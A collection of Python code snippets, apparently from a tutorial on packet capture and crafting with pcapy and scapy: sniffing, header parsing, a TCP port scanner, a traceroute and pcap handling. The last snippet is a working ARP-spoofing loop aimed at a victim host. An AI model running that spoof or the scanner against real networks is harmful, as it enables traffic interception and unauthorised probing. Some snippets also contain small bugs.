["```py\nsudo apt-get update\nsudo apt-get install python-pcapy\n```", "```py\n#!/usr/bin/python\nimport pcapy\ndevs = pcapy.findalldevs()\nprint(devs)\n#  device, bytes to capture per packet, promiscuous mode, timeout (ms)\ncap = pcapy.open_live(\"eth0\", 65536 , 1 , 0)\ncount = 1\nwhile count:\n    (header, payload) = cap.next()\n    print(count)\n    count = count + 1\n```", "```py\n#!/usr/bin/python\nimport pcapy\nfrom struct import *\ncap = pcapy.open_live(\"eth0\", 65536, 1, 0)\nwhile 1:\n    (header,payload) = cap.next()\n    l2hdr = payload[:14]\n    l2data = unpack(\"!6s6sH\", l2hdr)\n    srcmac = \"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\" % (ord(l2hdr[0]), ord(l2hdr[1]), ord(l2hdr[2]), ord(l2hdr[3]), ord(l2hdr[4]), ord(l2hdr[5]))\n    dstmac = \"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\" % (ord(l2hdr[6]), ord(l2hdr[7]), ord(l2hdr[8]), ord(l2hdr[9]), ord(l2hdr[10]), ord(l2hdr[11]))\n    print(\"Source MAC: \", srcmac, \" Destination MAC: \", dstmac)\n    # get IP header from bytes 14 to 34 in payload\n    ipheader = unpack('!BBHHHBBH4s4s' , payload[14:34])\n    timetolive = ipheader[5]\n    protocol = ipheader[6]\n    print(\"Protocol \", str(protocol), \" Time To Live: \", str(timetolive))\n```", "```py\nscapy>ls()\n```", "```py\nscapy>ls(IP)\nscapy>ls(ICMP)\nscapy>ls(TCP)\n```", "```py\nscapy>lsc()\n```", "```py\nscapy>icmp=IP(dst='google.com')/ICMP()\n```", "```py\nscapy>tcp=IP(dst='google.com')/TCP(dport=80)\nscapy>packet = Ether()/IP(dst=\"google.com\")/ICMP()/\"ABCD\"\n```", "```py\nscapy> packet.show()\nscapy> packet.show2()\n```", "```py\nscapy> ls (packet)\n```", "```py\n>>> packet[0].summary()\n```", "```py\nscapy> _.show()\nscapy> _.summary()\n```", "```py\n>> send(packet)\n```", "```py\n>>> sendp(Ether()/IP(dst=\"packtpub.com\")/ICMP()/\"Layer 2 packet\",iface=\"eth0\")\n```", "```py\nscapy> sendp(packet)\n```", "```py\nscapy>sendp(packet, loop=1, inter=1)\n```", "```py\n#!/usr/bin/python\nimport sys\nfrom scapy.all import *\n\np=Ether()/IP(dst='www.google.com')/ICMP()\nsend(p)\n```", "```py\nsniff(filter=\"\",iface=\"any\",prn=function,count=N)\n```", "```py\nscapy> pkts = sniff (iface = \"eth0\", count = 3)\n```", "```py\n> packet=sniff(filter=\"tcp\", iface=\"eth0\", prn=lambda x:x.summary())\n```", "```py\nfrom scapy.all import *\ninterface = \"eth0\"\ndef print_packet(packet):\n    ip_layer = packet.getlayer(IP)\n    print(\"[!] New Packet: {src} -> {dst}\".format(src=ip_layer.src, dst=ip_layer.dst))\n\nprint(\"[*] Start sniffing...\")\nsniff(iface=interface, filter=\"ip\", prn=print_packet)\nprint(\"[*] Stop sniffing\")\n```", "```py\n#import scapy module to python\nfrom scapy.all import *\n\n# custom custom packet sniffer action method\ndef sniffPackets(packet):\n if packet.haslayer(IP):\n     pckt_src=packet[IP].src\n     pckt_dst=packet[IP].dst\n     pckt_ttl=packet[IP].ttl\n     print \"IP Packet: %s is going to %s and has ttl value %s\" (pckt_src,pckt_dst,pckt_ttl)\n\ndef main():\n print \"custom packet sniffer\"\n #call scapy\u2019s sniff method\n sniff(filter=\"ip\",iface=\"wlan0\",prn=sniffPackets)\n\n if __name__ == '__main__':\n     main()\n```", "```py\nscapy> packetsICMP = sniff(iface=\"eth0\",filter=\"ICMP\", prn=lambda x:x.summary())\n```", "```py\nscapy> a = sniff(filter=\"TCP\", count=n)\n```", "```py\nscapy> a = sniff(filter=\"TCP\", count=100)\n```", "```py\nimport scapy module\nfrom scapy.all import *\n\n## create a packet count var\npacketCount = 0\n## define our custom action function\ndef customAction(packet):\n packetCount += 1\n return \"{} {} {}\".format(packetCount, packet[0][1].src, packet[0][1].dst)\n## setup sniff, filtering for IP traffic\nsniff(filter=\"IP\",prn=customAction)\n```", "```py\nfrom scapy.all import *\n\ndef arpDisplay(pkt):\n if pkt[ARP].op == 1: #request\n    x= \"Request: {} is asking about {} \".format(pkt[ARP].psrc,pkt[ARP].pdst)\n    print x\n if pkt[ARP].op == 2: #response\n     x = \"Response: {} has address {}\".format(pkt[ARP].hwsrc,pkt[ARP].psrc)\n     print x\n\nsniff(prn=arpDisplay, filter=\"ARP\", store=0, count=10)\n```", "```py\nscapy> a = sniff(filter=\"UDP and port 53\",count=100,prn=count_dns_request)\n```", "```py\n>>> DNS_QUERIES=0\n>>> def count_dns_request(package):\n>>>    global DNS_QUERIES\n>>>    if DNSQR in package:\n>>>        DNS_QUERIES +=1\n```", "```py\nfrom scapy.all import sr1, IP, TCP\n\nOPEN_PORTS = []\n\ndef analyze_port(host, port):\n \"\"\"\n Function that determines the status of a port: Open / closed\n :param host: target\n :param port: port to test\n :type port: int\n \"\"\"\n\n print \"[ii] Scanning port %s\" % port\n res = sr1(IP(dst=host)/TCP(dport=port), verbose=False, timeout=0.2)\n if res is not None and TCP in res:\n     if res[TCP].flags == 18:\n         OPEN_PORTS.append(port)\n         print \"Port %s open\" % port\n\ndef main():\n for x in xrange(0, 80):\n     analyze_port(\"domain\", x)\n print \"[*] Open ports:\"\n for x in OPEN_PORTS:\n     print \" - %s/TCP\" % x\n```", "```py\nfrom scapy.all import *\nip_packet = IP(dst=\"google.com\", ttl=10)\nudp_packet = UDP(dport=40000)\nfull_packet = IP(dst=\"google.com\", ttl=10) / UDP(dport=40000)\n```", "```py\nsend(full_packet)\n```", "```py\nfrom scapy.all import *\nhostname = \"google.com\"\nfor i in range(1, 28):\n    pkt = IP(dst=hostname, ttl=i) / UDP(dport=33434)\n    # Send package and wait for an answer\n    reply = sr1(pkt, verbose=0)\n    if reply is None:\n    # No reply\n       break\n    elif reply.type == 3:\n    # the destination has been reached\n        print \"Done!\", reply.src\n        break\n    else:\n    # We\u2019re in the middle communication\n        print \"%d hops away: \" % i , reply.src\n```", "```py\nscapy> file=rdpcap('<path_file.pcap>')\nscapy> file.summary()\nscapy> file.sessions()\nscapy> file.show()\n```", "```py\nscapy > packets = sniff(filter='tcp port 21')\n scapy> file=wrpcap('<path_file.pcap>',packets)\n```", "```py\nscapy> file=rdpcap('<path_file.pcap>')\n```", "```py\nscapy> pkts = sniff(offline=\"file.pcap\")\n```", "```py\n>>> sniff (filter = \"ip and host 195.221.189.155\", count = 2)\n<Sniffed TCP: 2 UDP: 0 ICMP: 0 Other: 0>\n```", "```py\nsniff(filter=\"tcp and (port 443 or port 80)\",prn=lambda x:x.sprintf(\"%.time% %-15s,IP.src% -> %-15s,IP.dst% %IP.chksum% %03xr, IP.proto% %r,TCP.flags%\"))\n```", "```py\nfrom scapy.all import *\nimport time\n\nop=1 # Op code 1 for query arp\nvictim=\"<victim_ip>\" # replace with the victim's IP\nspoof=\"<ip_gateway>\" # replace with the IP of the gateway\nmac=\"<attack_mac_address>\" # replace with the attacker's MAC address\n\narp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)\n\nwhile True:\n send(arp)\n time.sleep(2)\n```"]